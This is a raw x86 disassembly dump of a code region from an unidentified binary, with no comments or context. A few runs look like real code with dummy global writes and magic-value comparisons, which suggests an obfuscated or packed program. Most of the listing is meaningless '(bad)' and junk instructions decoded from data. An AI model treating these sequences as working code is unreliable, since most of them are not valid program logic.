  402057:	iret   
  402058:	inc    eax
  402059:	out    dx,al
  40205a:	sbb    eax,esi
  40205c:	and    BYTE PTR [ebp+edx*2+0x14],al
  402060:	push   ss
  402061:	pop    edx
  402062:	jns    0x402079
  402064:	push   ds
  402065:	mov    ?,WORD PTR [ebp-0x4d]
  402068:	jge    0x402063
  40206a:	jmp    0xfb53:0x87f58457
  402071:	mov    edx,DWORD PTR [ebp-0x20]
  402074:	mov    DWORD PTR [ebp-0x2c],0x4eb9
  40207b:	mov    DWORD PTR ds:0x42ef24,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e85a,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e862,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi+0x552e4d95],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x40212c
  4020cf:	jns    0x402057
  4020d1:	adc    ch,BYTE PTR [esi-0x18]
  4020d4:	inc    ebp
  4020d5:	fcomp  DWORD PTR [esp+eiz*8-0x2c]
  4020d9:	stos   DWORD PTR es:[edi],eax
  4020da:	pop    ebx
  4020db:	inc    esi
  4020dc:	daa    
  4020dd:	adc    BYTE PTR [ecx+0xa25ff9e],al
  4020e3:	(bad)  
  4020e4:	stc    
  4020e5:	mov    ecx,DWORD PTR [edi+0x78]
  4020e8:	jg     0x40208f
  4020ea:	mov    esi,0xa2ea3353
  4020ef:	aad    0x6f
  4020f1:	retf   0xb3af
  4020f4:	lahf   
  4020f5:	mov    WORD PTR [ebp-0x4d9e66f5],fs
  4020fb:	sbb    ecx,DWORD PTR [edx-0x4d794c3d]
  402101:	(bad)  
  402102:	jecxz  0x402173
  402104:	mov    edx,0xe5292594
  402109:	jmp    0x40208d
  40210b:	sub    al,BYTE PTR [edx-0x5e03fc27]
  402111:	test   esi,esp
  402113:	xor    eax,eax
  402115:	mov    al,0x3f
  402117:	cli    
  402118:	stos   BYTE PTR es:[edi],al
  402119:	ret    
  40211a:	fisttp WORD PTR [ebp+0x7]
  40211d:	(bad)  
  40211e:	pop    ds
  40211f:	push   es
  402120:	pop    esp
  402121:	sar    BYTE PTR [ebp-0x3a8a3dc4],0xe2
  402128:	xor    eax,0xcaad8743
  40212d:	repz jmp 0x2f81:0x5e1925b4
  402135:	or     eax,0x98976db4
  40213a:	and    ebx,DWORD PTR [edx-0x73]
  40213d:	imul   edi,DWORD PTR [esi-0x4b9199b],0x74
  402144:	push   ebp
  402145:	dec    esp
  402146:	std    
  402147:	jmp    0x81c27022
  40214c:	call   0x1290:0xcaf4d8f2
  402153:	mov    ds:0xd921a5a6,al
  402158:	ins    DWORD PTR es:[edi],dx
  402159:	pushf  
  40215a:	(bad)  
  40215b:	sub    al,0xc4
  40215d:	xchg   ebx,eax
  40215e:	inc    esi
  40215f:	push   eax
  402160:	jns    0x4021b6
  402162:	enter  0xb3b5,0xbc
  402166:	in     al,dx
  402167:	pop    edx
  402168:	mov    ebp,0x9010d54f
  40216d:	push   edx
  40216e:	push   cs
  40216f:	stc    
  402170:	fwait
  402171:	dec    eax
  402172:	push   ss
  402173:	push   eax
  402174:	retf   0x8da4
  402177:	outs   dx,BYTE PTR ds:[esi]
  402178:	push   0x6d
  40217a:	sti    
  40217b:	mov    esi,0x67d357bc
  402180:	mov    esp,0x7902700a
  402185:	mov    ebp,0x961fee58
  40218a:	xor    al,bl
  40218c:	mov    ah,cl
  40218e:	push   edi
  40218f:	dec    ebp
  402190:	jae    0x40211d
  402192:	or     eax,0x28328434
  402197:	sub    eax,0x871c4fa6
  40219c:	jecxz  0x40220e
  40219e:	xor    eax,0xac497cfb
  4021a3:	aaa    
  4021a4:	cli    
  4021a5:	dec    esp
  4021a6:	(bad)  
  4021a7:	mov    esi,0xa8ba8ed2
  4021ac:	inc    esp
  4021ad:	pop    edi
  4021ae:	adc    al,0xc
  4021b0:	sbb    ecx,DWORD PTR [edx]
  4021b2:	xchg   ebx,eax
  4021b3:	in     eax,dx
  4021b4:	fwait
  4021b5:	inc    ecx
  4021b6:	inc    esi
  4021b7:	pop    edx
  4021b8:	jge    0x40216c
  4021ba:	lea    eax,[edi-0x1f]
  4021bd:	neg    BYTE PTR [eax+0x5f]
  4021c0:	pop    ds
  4021c1:	dec    esp
  4021c2:	mov    ch,0x1f
  4021c4:	jp     0x4021ad
  4021c6:	xchg   esp,eax
  4021c7:	rcl    BYTE PTR [edi],1
  4021c9:	inc    ecx
  4021ca:	loopne 0x402153
  4021cc:	lea    esi,[ecx+esi*2+0x4b]
  4021d0:	loop   0x402249
  4021d2:	push   0x79cbf200
  4021d7:	scas   eax,DWORD PTR es:[edi]
  4021d8:	mov    BYTE PTR [edx+0x2f7f9f23],dl
  4021de:	push   edx
  4021df:	sub    DWORD PTR [ebx-0x8e3779b],0x3c
  4021e6:	aaa    
  4021e7:	test   DWORD PTR [ecx-0x7eb20bec],ebp
  4021ed:	scas   eax,DWORD PTR es:[edi]
  4021ee:	sub    DWORD PTR [esi],esp
  4021f0:	mov    WORD PTR [edi+0x2b6a9d24],?
  4021f6:	stc    
  4021f7:	jno    0x402208
  4021f9:	cdq    
  4021fa:	mov    ah,0x90
  4021fc:	clc    
  4021fd:	xchg   edi,eax
  4021fe:	rcr    BYTE PTR [edx],cl
  402200:	and    DWORD PTR [edx+0x3e],ebp
  402203:	inc    eax
  402204:	ins    DWORD PTR es:[edi],dx
  402205:	mov    ebp,0xb12c4756
  40220a:	and    BYTE PTR [eax],dl
  40220c:	(bad)  
  40220d:	push   ss
  40220e:	push   ebp
  40220f:	mov    eax,ds:0x7977095c
  402214:	jmp    0x4021c4
  402216:	pop    esp
  402217:	cmp    ah,BYTE PTR [eax]
  402219:	es cmp dh,dh
  40221c:	leave  
  40221d:	and    edx,eax
  40221f:	mov    edx,0xe9505e50
  402224:	sub    dl,ah
  402226:	and    DWORD PTR ds:0xdf50b21a,0x6e577c77
  402230:	test   eax,0xf15b16ef
  402235:	xor    eax,0x6c86ffde
  40223a:	xor    dl,BYTE PTR [edi+0x2c0040b8]
  402240:	das    
  402241:	xor    ah,cl
  402243:	pop    esp
  402244:	pop    edx
  402245:	pop    ecx
  402246:	pop    ss
  402247:	or     DWORD PTR [eax+esi*2-0xc90975c],edx
  40224e:	push   ebp
  40224f:	repnz ss mov cl,0xfb
  402253:	mov    esp,0x8b1ebde7
  402258:	repz cmp BYTE PTR [edx+0x16],0xaf
  40225d:	add    al,0x23
  40225f:	jbe    0x4022bd
  402261:	pop    ebp
  402262:	jno    0x40223f
  402264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402265:	inc    ebp
  402266:	hlt    
  402267:	lods   eax,DWORD PTR ds:[esi]
  402268:	push   ebx
  402269:	lea    esi,[esi-0x24]
  40226c:	pop    ecx
  40226d:	in     eax,dx
  40226e:	mov    bh,0x9d
  402270:	xor    DWORD PTR [edi-0x7],esi
  402273:	jnp    0x402280
  402275:	sbb    eax,0xa455997d
  40227a:	mov    dl,BYTE PTR [eax+0xc]
  40227d:	mov    ecx,0x32b0ca9d
  402282:	sub    al,0x62
  402284:	pop    esi
  402285:	pop    esp
  402286:	enter  0x2273,0x4d
  40228a:	jno    0x402247
  40228c:	test   al,0x12
  40228e:	je     0x4022d7
  402290:	xchg   ebx,eax
  402291:	(bad)  
  402292:	leave  
  402293:	popf   
  402294:	in     al,dx
  402295:	mov    ds:0xdcad329,al
  40229a:	shr    ecx,cl
  40229c:	jl     0x4022c6
  40229e:	scas   eax,DWORD PTR es:[edi]
  40229f:	int3   
  4022a0:	or     edi,DWORD PTR [esi-0x209b5f39]
  4022a6:	iret   
  4022a7:	fidivr WORD PTR [edx-0x396723da]
  4022ad:	jle    0x4022a0
  4022af:	aam    0xbb
  4022b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022b2:	loopne 0x40228d
  4022b4:	cwde   
  4022b5:	loope  0x4022cf
  4022b7:	in     al,dx
  4022b8:	jge    0x4022d8
  4022ba:	and    BYTE PTR [edi-0x5f],0x76
  4022be:	inc    ebx
  4022bf:	inc    ebx
  4022c0:	xchg   edx,eax
  4022c1:	push   ebp
  4022c2:	push   ecx
  4022c3:	xchg   ebp,eax
  4022c4:	enter  0x1171,0xc4
  4022c8:	jecxz  0x402262
  4022ca:	jbe    0x4022f9
  4022cc:	fistp  QWORD PTR [edi]
  4022ce:	inc    edi
  4022cf:	call   0x5f14:0xeca42061
  4022d6:	out    dx,al
  4022d7:	imul   ebx,DWORD PTR [edi+0x2f],0x2356eca0
  4022de:	out    0xf2,eax
  4022e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022e1:	sbb    DWORD PTR [ebp+ebx*4+0x12],edx
  4022e5:	xchg   edi,eax
  4022e6:	pop    ecx
  4022e7:	cdq    
  4022e8:	mov    dl,0xa9
  4022ea:	in     eax,dx
  4022eb:	in     eax,dx
  4022ec:	push   0xd0afe362
  4022f1:	test   BYTE PTR es:[esi+0x74],ah
  4022f5:	sti    
  4022f6:	int    0x66
  4022f8:	jno    0x4022e7
  4022fa:	xor    al,0x3a
  4022fc:	sti    
  4022fd:	mov    edi,0xf289b4b2
  402302:	sub    ebp,DWORD PTR [ebp-0x59822294]
  402308:	imul   esi,DWORD PTR [esi],0xc12dc147
  40230e:	dec    ebp
  40230f:	gs push eax
  402311:	cmc    
  402312:	sub    esi,DWORD PTR [esi-0x23]
  402315:	jl     0x402392
  402317:	dec    esi
  402318:	mov    bh,0x12
  40231a:	and    edi,esi
  40231c:	loop   0x40234a
  40231e:	lahf   
  40231f:	sbb    BYTE PTR [ebp+0x56],cl
  402322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402323:	mov    eax,ds:0x93816d1d
  402328:	pusha  
  402329:	sub    ecx,DWORD PTR [esi-0x3256ed2e]
  40232f:	dec    ebx
  402330:	(bad)  [eax-0x23]
  402333:	int    0x27
  402335:	popa   
  402336:	int    0x7d
  402338:	cmc    
  402339:	adc    eax,0xffffffdf
  40233c:	pop    eax
  40233d:	pop    ss
  40233e:	mov    ds,ecx
  402340:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  402342:	lock test BYTE PTR [eax+0x60],dh
  402346:	mov    eax,ds:0x1b517414
  40234b:	inc    esp
  40234c:	xor    dl,BYTE PTR [ebx+edx*8-0x2d]
  402350:	jae    0x40232e
  402352:	sti    
  402353:	push   ebp
  402354:	cmp    bh,BYTE PTR [ebx+esi*4+0x2cc40f57]
  40235b:	xchg   BYTE PTR ds:0xf876ab5f,ch
  402361:	mov    ch,0x2f
  402363:	push   ebp
  402364:	mov    edx,0xcdac7f25
  402369:	lea    eax,[edx-0x370d0927]
  40236f:	and    dh,dl
  402371:	loope  0x402348
  402373:	mov    cl,BYTE PTR [edx]
  402375:	or     esi,edx
  402377:	je     0x40232c
  402379:	push   ss
  40237a:	adc    al,BYTE PTR [eax-0x24]
  40237d:	pop    ss
  40237e:	pop    edx
  40237f:	fwait
  402380:	mov    cl,0x14
  402382:	add    BYTE PTR [ecx-0x32893c09],dh
  402388:	mov    esp,0x5a870192
  40238d:	mov    ebx,0x529d0c84
  402392:	jae    0x4023eb
  402394:	fstp   DWORD PTR [esi-0x70c49641]
  40239a:	fsubr  DWORD PTR [esi+0x6c86a7d3]
  4023a0:	shl    DWORD PTR [esi],0x5f
  4023a3:	pop    es
  4023a4:	test   eax,0x60e546a
  4023a9:	mov    ds:0x47a06584,eax
  4023ae:	mov    dl,cl
  4023b0:	test   DWORD PTR [edx],edi
  4023b2:	push   eax
  4023b3:	adc    esi,esp
  4023b5:	leave  
  4023b6:	dec    edi
  4023b7:	sahf   
  4023b8:	cli    
  4023b9:	test   DWORD PTR [ebx+0x2e],ebx
  4023bc:	test   BYTE PTR [ebp+0x50f6d14e],0x9c
  4023c3:	ror    BYTE PTR [edi+esi*8+0x434de7ca],1
  4023ca:	jmp    0x402408
  4023cc:	pop    eax
  4023cd:	mov    bl,0xce
  4023cf:	and    esi,DWORD PTR [edi+0x11f6e41f]
  4023d5:	jo     0x4023ea
  4023d7:	pop    es
  4023d8:	push   esi
  4023d9:	mov    ds:0x4a75a3cd,al
  4023de:	ins    BYTE PTR es:[edi],dx
  4023df:	es inc ecx
  4023e1:	sbb    DWORD PTR [edi-0x57],0xffffff8d
  4023e5:	cmp    bh,dl
  4023e7:	lds    ebp,FWORD PTR [ebx+0x63872049]
  4023ed:	push   edi
  4023ee:	adc    bl,BYTE PTR [esi+0x38]
  4023f1:	sbb    eax,ebx
  4023f3:	in     al,dx
  4023f4:	retf   0x41f6
  4023f7:	mov    ds:0x27c9e9f1,al
  4023fc:	push   ecx
  4023fd:	dec    esi
  4023fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023ff:	fisttp DWORD PTR [eax-0x18adc789]
  402405:	and    bh,BYTE PTR fs:[edi-0x1b]
  402409:	mov    al,ds:0xb6125376
  40240e:	and    eax,esi
  402410:	dec    ebp
  402411:	cwde   
  402412:	dec    edi
  402413:	hlt    
  402414:	pop    eax
  402415:	scas   eax,DWORD PTR es:[edi]
  402416:	push   edi
  402417:	cmp    eax,0xf38fb082
  40241c:	lock js 0x40244a
  40241f:	adc    DWORD PTR [edi+0x24],edi
  402422:	or     ah,BYTE PTR [edx+0x5]
  402425:	icebp  
  402426:	into   
  402427:	mov    edi,0xa476fbcb
  40242c:	push   ecx
  40242d:	leave  
  40242e:	sub    al,0x53
  402430:	add    esp,DWORD PTR [edi]
  402432:	mov    esi,0xd3a122f4
  402437:	xor    dl,BYTE PTR [ebx]
  402439:	nop
  40243a:	ds clc 
  40243c:	pusha  
  40243d:	fistp  DWORD PTR [edi-0x61]
  402440:	test   BYTE PTR [edx+0x782c8fe1],bh
  402446:	enter  0xcc1e,0x5a
  40244a:	mov    dl,0x85
  40244c:	or     eax,0x9ad9c084
  402451:	xchg   ecx,eax
  402452:	outs   dx,BYTE PTR ds:[esi]
  402453:	ficomp WORD PTR [eax]
  402455:	push   ds
  402456:	xor    ecx,DWORD PTR [eax]
  402458:	cwde   
  402459:	xchg   esi,eax
  40245a:	mov    cl,0x6c
  40245c:	fdiv   QWORD PTR es:[edi-0x11]
  402460:	push   esp
  402461:	pushf  
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x430646,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x4305be,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x4305ba,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	es add ecx,esi
  4024b5:	jl     0x402509
  4024b7:	movd   DWORD PTR [esi-0x7e],mm7
  4024bb:	jno    0x40253b
  4024bd:	jle    0x4024f5
  4024bf:	lds    esp,FWORD PTR [edi+0x3d]
  4024c2:	(bad)
  4024c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024c6:	(bad)
  4024c9:	push   0x25
  4024cb:	jmp    0x4024e1
  4024cd:	stos   DWORD PTR es:[edi],eax
  4024ce:	test   DWORD PTR [edi+0x1],eax
  4024d1:	push   es
  4024d2:	sub    DWORD PTR [ebx+ebx*4],edx
  4024d5:	aas    
  4024d6:	xor    al,0x81
  4024d8:	in     eax,dx
  4024d9:	imul   DWORD PTR [eax]
  4024db:	out    dx,eax
  4024dc:	lods   al,BYTE PTR ds:[esi]
  4024dd:	add    cl,BYTE PTR [eax+0x43b8a2da]
  4024e3:	mov    al,0xb9
  4024e5:	cwde   
  4024e6:	jecxz  0x402476
  4024e8:	das    
  4024e9:	addr16 retf 0x55c7
  4024ed:	dec    edx
  4024ee:	sub    bh,BYTE PTR [esi+eiz*2+0x7f]
  4024f2:	in     al,0x13
  4024f4:	adc    eax,0x8973058e
  4024f9:	cdq    
  4024fa:	sbb    al,0x19
  4024fc:	test   BYTE PTR [ebp+0x72],dh
  4024ff:	fadd   st(6),st
  402501:	sbb    eax,0xa2afd8f6
  402506:	int    0x7a
  402508:	jecxz  0x40253c
  40250a:	je     0x4024e1
  40250c:	aaa    
  40250d:	inc    ebx
  40250e:	pop    esi
  40250f:	mov    ds:0x354bb4a8,al
  402514:	repnz push ds
  402516:	(bad)  
  402518:	inc    ecx
  402519:	jae    0x402537
  40251b:	cmp    eax,0x96b0d1c7
  402520:	addr16 jmp 0x7e7a049c
  402526:	adc    bl,cl
  402528:	sar    DWORD PTR [edx-0x4b],1
  40252b:	mov    ds:0x5abfcc76,al
  402530:	stos   DWORD PTR es:[edi],eax
  402531:	inc    ebp
  402532:	retf   
  402533:	xchg   DWORD PTR ds:0xd7894df,edi
  402539:	and    edx,ebx
  40253b:	xchg   esi,eax
  40253c:	ficomp WORD PTR fs:[edx+0x56]
  402540:	test   BYTE PTR ds:0xecbfae74,dl
  402546:	jl     0x40259b
  402548:	test   bl,dl
  40254a:	pop    es
  40254b:	(bad)  
  40254c:	push   esp
  40254d:	sub    BYTE PTR ds:0xc9b234e2,bl
  402553:	xchg   DWORD PTR [edx+ebx*4],esp
  402556:	shl    DWORD PTR [eax],0x24
  402559:	xor    DWORD PTR [edx],0xcd3db9d8
  40255f:	mov    cl,0x4
  402561:	xchg   ebx,eax
  402562:	mov    al,ds:0x368949fc
  402567:	push   esi
  402568:	and    DWORD PTR [edi+0x7b],ebx
  40256b:	fst    QWORD PTR [ebp-0x2d]
  40256e:	mov    dl,BYTE PTR [ebp-0x1597b8fc]
  402574:	loop   0x402562
  402576:	lea    esi,[esi+0x5b31aab1]
  40257c:	(bad)  
  40257e:	fs stos DWORD PTR es:[edi],eax
  402580:	and    dl,BYTE PTR [ebx-0x77ab908f]
  402586:	mov    ebp,0x8090a8ea
  40258b:	dec    eax
  40258c:	and    ecx,DWORD PTR [esi-0x9]
  40258f:	icebp  
  402590:	xor    ah,BYTE PTR [ecx]
  402592:	sub    al,0xfd
  402594:	pop    edx
  402595:	call   0x8db9c3ff
  40259a:	inc    ecx
  40259b:	rol    DWORD PTR [edx+ebx*1+0x3],cl
  40259f:	push   0xffffff9f
  4025a1:	fwait
  4025a2:	xor    esp,DWORD PTR [ebp+0x45]
  4025a5:	xchg   ebx,eax
  4025a6:	sbb    al,0x3b
  4025a8:	hlt    
  4025a9:	mov    WORD PTR [esi],ds
  4025ab:	scas   al,BYTE PTR es:[edi]
  4025ac:	retf   
  4025ad:	outs   dx,BYTE PTR ds:[esi]
  4025ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025af:	pushf  
  4025b0:	gs sbb ebp,ebp
  4025b3:	aaa    
  4025b4:	jae    0x4025c9
  4025b6:	test   eax,0x1f429588
  4025bb:	data16 loop 0x402639
  4025be:	ret    
  4025bf:	xor    al,0x7f
  4025c1:	in     al,0x77
  4025c3:	out    dx,al
  4025c4:	test   bh,bh
  4025c6:	out    0x63,al
  4025c8:	ret    
  4025c9:	jle    0x4025fc
  4025cb:	push   eax
  4025cc:	test   DWORD PTR ds:0x4b7e7a9a,edi
  4025d2:	das    
  4025d3:	adc    esi,DWORD PTR [edx-0x598f053f]
  4025d9:	xor    al,0xe
  4025db:	or     esi,DWORD PTR [ecx+0x40]
  4025de:	pop    es
  4025df:	nop
  4025e0:	inc    ebx
  4025e1:	test   al,0xb5
  4025e3:	xchg   esi,eax
  4025e4:	push   eax
  4025e5:	mov    ebp,0x85ec2c6d
  4025ea:	pushf  
  4025eb:	lods   al,BYTE PTR ds:[esi]
  4025ec:	pop    ds
  4025ed:	sahf   
  4025ee:	inc    ecx
  4025ef:	jp     0x4025ed
  4025f1:	iretw  
  4025f3:	dec    ecx
  4025f4:	jo     0x40263b
  4025f6:	pop    edi
  4025f7:	sbb    edx,DWORD PTR [edi-0x676ddc05]
  4025fd:	mov    bh,0x2
  4025ff:	and    al,cl
  402601:	push   ecx
  402602:	out    dx,al
  402603:	mov    al,ds:0x957f0dcb
  402608:	(bad)
  40260d:	js     0x402668
  40260f:	imul   edi,ebp,0xda60da44
  402615:	test   DWORD PTR [esi],ecx
  402617:	jl     0x402622
  402619:	sti    
  40261a:	shl    eax,0xc0
  40261d:	imul   ebx,esp,0xda441d33
  402623:	dec    esp
  402624:	pop    es
  402625:	in     eax,dx
  402626:	les    esp,FWORD PTR [ebx]
  402628:	nop
  402629:	test   cl,ch
  40262b:	pmaxub mm3,QWORD PTR [ebx+0x68]
  40262f:	inc    edx
  402630:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402632:	fwait
  402633:	popf   
  402634:	cmp    DWORD PTR [edi],edi
  402636:	mov    eax,ds:0xc8b9a76f
  40263b:	in     al,0xbc
  40263d:	adc    al,0x28
  40263f:	jge    0x40269a
  402641:	or     DWORD PTR [ebp+0x1],edx
  402644:	ss push ds
  402646:	mov    ds:0x93c1b68c,eax
  40264b:	mov    ebp,0x1b332894
  402650:	dec    eax
  402651:	lds    ebp,FWORD PTR [esi-0x225072d9]
  402657:	out    0x92,al
  402659:	push   ecx
  40265a:	push   ss
  40265b:	in     al,0x8a
  40265d:	popf   
  40265e:	imul   esp,DWORD PTR [edi-0x6],0x26
  402662:	mov    ds:0xcf1bbf7e,eax
  402667:	xchg   ebx,eax
  402668:	cld    
  402669:	cmp    al,0x2f
  40266b:	adc    al,0xe1
  40266d:	push   0x22
  40266f:	stos   BYTE PTR es:[edi],al
  402670:	fldz   
  402672:	out    dx,al
  402673:	fwait
  402674:	or     al,0x1e
  402676:	sub    dh,BYTE PTR [eax]
  402678:	out    dx,al
  402679:	pop    ebp
  40267a:	mov    ?,WORD PTR [edi-0x5ef286af]
  402680:	or     eax,0x17a8c1ed
  402685:	test   BYTE PTR [esi],dl
  402687:	sub    BYTE PTR [ebx],bl
  402689:	mov    BYTE PTR [edx+0x1ce25533],bl
  40268f:	mov    dl,0x51
  402691:	sbb    eax,0x1d715204
  402696:	pop    ebp
  402697:	push   edi
  402698:	pop    ebx
  402699:	xor    BYTE PTR [edx],bl
  40269b:	(bad)  [ecx]
  40269d:	pushf  
  40269e:	jbe    0x40263a
  4026a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026a1:	and    esp,DWORD PTR [eax]
  4026a3:	ds inc ecx
  4026a5:	scas   al,BYTE PTR es:[edi]
  4026a6:	ror    DWORD PTR [eax-0x1d],0xd3
  4026aa:	jns    0x40268d
  4026ac:	dec    edi
  4026ad:	push   ecx
  4026ae:	inc    ebx
  4026af:	ret    
  4026b0:	mov    esi,0x8a38364b
  4026b5:	jns    0x402702
  4026b7:	pop    edx
  4026b8:	cmp    BYTE PTR [esi+ecx*1],bh
  4026bb:	(bad)  
  4026bc:	dec    ebp
  4026bd:	jne    0x40269e
  4026bf:	or     ah,BYTE PTR [ebp+0x5b6967de]
  4026c5:	pop    eax
  4026c6:	data16 daa 
  4026c8:	push   eax
  4026c9:	test   BYTE PTR [eax],al
  4026cb:	aam    0x3f
  4026cd:	popf   
  4026ce:	ror    DWORD PTR [edx],cl
  4026d0:	test   DWORD PTR [edi],0x34fee80f
  4026d6:	sbb    al,0x95
  4026d8:	xchg   ecx,eax
  4026d9:	aad    0x1c
  4026db:	cmp    al,0xc
  4026dd:	in     eax,0xbe
  4026df:	sbb    DWORD PTR ds:0xc5c5eb94,edx
  4026e5:	gs mov ebx,cs
  4026e8:	mov    DWORD PTR [edx],0xb908c35c
  4026ee:	(bad)  
  4026ef:	aam    0x25
  4026f1:	mov    ebp,0x2fa8266b
  4026f6:	js     0x40268d
  4026f8:	sar    BYTE PTR [ecx],1
  4026fa:	daa    
  4026fb:	dec    esi
  4026fc:	dec    edx
  4026fd:	mov    al,0xf9
  4026ff:	out    dx,al
  402700:	sbb    DWORD PTR [edi-0x7b55549d],ecx
  402706:	jne    0x4026b4
  402708:	(bad)  
  402709:	lods   eax,DWORD PTR ds:[esi]
  40270a:	adc    DWORD PTR ds:0xca91d835,0x54
  402711:	and    BYTE PTR ds:0x9c3a3979,bh
  402717:	mov    eax,ds
  402719:	iret   
  40271a:	cmp    dl,0x90
  40271d:	add    DWORD PTR [eax-0x48956575],edi
  402723:	push   esp
  402724:	xor    esp,DWORD PTR [ebp-0xfa4f18e]
  40272a:	dec    esi
  40272b:	pusha  
  40272c:	dec    esi
  40272d:	aaa    
  40272e:	fist   WORD PTR [esi-0x6d80f573]
  402734:	xchg   edi,eax
  402735:	repz leave 
  402737:	outs   dx,BYTE PTR ds:[esi]
  402738:	scas   eax,DWORD PTR es:[edi]
  402739:	inc    ebp
  40273a:	dec    ebx
  40273b:	jne    0x402743
  40273d:	pop    esi
  40273e:	xlat   BYTE PTR ds:[ebx]
  40273f:	or     cl,0x6f
  402742:	test   BYTE PTR [eax],ah
  402744:	rcl    BYTE PTR [esi],0x79
  402747:	in     al,0x1a
  402749:	xlat   BYTE PTR ds:[bx]
  40274b:	xchg   ebp,eax
  40274c:	mov    al,ds:0x97288bc1
  402751:	daa    
  402752:	cmp    BYTE PTR [ecx-0x4b25a49d],bh
  402758:	add    eax,DWORD PTR [esp+edi*1]
  40275b:	add    BYTE PTR [esi],bh
  40275d:	pushf  
  40275e:	mov    ebp,0xaee7809a
  402763:	push   ss
  402764:	loopne 0x4026ff
  402766:	add    ebp,DWORD PTR [ebp-0x7f70160d]
  40276c:	and    al,0x5a
  40276e:	aas    
  40276f:	imul   ecx,DWORD PTR [ebx-0x52],0x57
  402773:	sti    
  402774:	dec    esp
  402775:	xchg   ebp,eax
  402776:	push   0x6c
  402778:	add    al,0x98
  40277a:	js     0x402710
  40277c:	ret    
  40277d:	inc    ecx
  40277e:	fcom   DWORD PTR [esi+0xe]
  402781:	mov    al,0xce
  402783:	test   eax,0x8af937f7
  402788:	repnz icebp 
  40278a:	stos   DWORD PTR es:[edi],eax
  40278b:	xor    eax,0x9b4b80ee
  402790:	adc    eax,0x22a925cd
  402795:	inc    esi
  402796:	push   ecx
  402797:	pop    ebp
  402798:	mov    esi,DWORD PTR [ebx+0x13]
  40279b:	cli    
  40279c:	loopne 0x4027d9
  40279e:	das    
  40279f:	jle    0x4027bb
  4027a1:	adc    cl,bh
  4027a3:	xor    DWORD PTR [ebx+0x618e8a14],esp
  4027a9:	mov    esi,0xdc8f2d6f
  4027ae:	sbb    edi,DWORD PTR [ebx]
  4027b0:	xor    BYTE PTR [ecx-0x775d8b32],cl
  4027b6:	cmp    DWORD PTR [edi],eax
  4027b8:	jl     0x32a643a5
  4027be:	or     DWORD PTR [edx-0x10],esi
  4027c1:	sub    DWORD PTR [edi+0x59ffa1b2],0x1f116d99
  4027cb:	mov    ch,0xbd
  4027cd:	xor    al,0x62
  4027cf:	add    al,0xda
  4027d1:	gs aaa 
  4027d3:	imul   ebx,DWORD PTR [esi+0x3b76ade5],0xffffff8e
  4027da:	inc    edi
  4027db:	push   ds
  4027dc:	inc    eax
  4027dd:	sbb    ecx,DWORD PTR [ebx-0x5f]
  4027e0:	jb     0x402821
  4027e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027e3:	cmp    bl,BYTE PTR [edi+ebp*1-0x67d87c4e]
  4027ea:	loopne 0x4027e7
  4027ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027ed:	test   BYTE PTR [eax+ebp*4+0x33],ch
  4027f1:	in     al,0x55
  4027f3:	(bad)  
  4027f4:	mov    ecx,0x6ca1f58f
  4027f9:	fiadd  WORD PTR [edx+edx*8]
  4027fc:	sub    DWORD PTR [ecx+eax*1],ecx
  4027ff:	fnstenv [edx-0x2bfef84]
  402805:	adc    ah,BYTE PTR [ebp-0x5d]
  402808:	in     al,0x94
  40280a:	arpl   WORD PTR [edi-0x5],bp
  40280d:	pop    ss
  40280e:	sub    al,0xe2
  402810:	add    edi,DWORD PTR [ebx-0xb]
  402813:	add    ebx,edi
  402815:	pop    ebp
  402816:	or     al,BYTE PTR [eax+ecx*1-0x43c1fd72]
  40281d:	test   eax,0x6d174ca1
  402822:	stos   DWORD PTR es:[edi],eax
  402823:	add    ch,BYTE PTR [edx]
  402825:	lahf   
  402826:	xor    al,0x4f
  402828:	les    edi,FWORD PTR [esi+ebp*4]
  40282b:	popf   
  40282c:	sti    
  40282d:	je     0x402875
  40282f:	pusha  
  402830:	enter  0xe36e,0x91
  402834:	gs xchg esp,eax
  402836:	jno    0x402835
  402838:	rcl    DWORD PTR [esi],0xd6
  40283b:	sbb    al,0x8c
  40283d:	and    DWORD PTR [eax-0x51],esp
  402840:	push   esi
  402841:	xor    eax,0x6752c77f
  402846:	rol    BYTE PTR [ebx],1
  402848:	fst    QWORD PTR [edi+0x696c2d8f]
  40284e:	cli    
  40284f:	ret    
  402850:	sbb    ch,BYTE PTR [edx-0x7f]
  402853:	or     BYTE PTR [esi-0x389f8ae4],bl
  402859:	add    eax,0x42e85e
